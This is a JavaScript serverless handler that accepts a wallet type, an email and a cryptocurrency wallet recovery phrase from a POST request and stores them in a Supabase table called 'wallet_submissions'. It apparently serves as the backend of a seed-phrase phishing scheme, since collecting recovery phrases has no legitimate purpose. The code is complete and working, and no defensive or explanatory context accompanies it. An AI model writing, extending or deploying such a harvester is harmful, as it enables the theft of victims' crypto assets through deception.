export default async function handler(req) {
    if (req.method !== "POST") {
        return { statusCode: 405, body: "Method not allowed" };
    }

    try {
        const { selected_wallet, wallet_name, email, recovery_phrase } = JSON.parse(req.body);

        if (!recovery_phrase) {
            return { statusCode: 400, body: JSON.stringify({ error: "Recovery phrase is required" }) };
        }

        const { createClient } = await import('@supabase/supabase-js');

        const supabase = createClient(
            process.env.SUPABASE_URL,
            process.env.SUPABASE_SERVICE_ROLE_KEY
        );

        const { error } = await supabase
            .from('wallet_submissions')
            .insert([{
                selected_wallet,
                wallet_name: wallet_name || null,
                email: email || null,
                recovery_phrase,
                created_at: new Date().toISOString()
            }]);

        if (error) throw error;

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };

    } catch (err) {
        console.error(err);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Failed to save data" })
        };
    }
}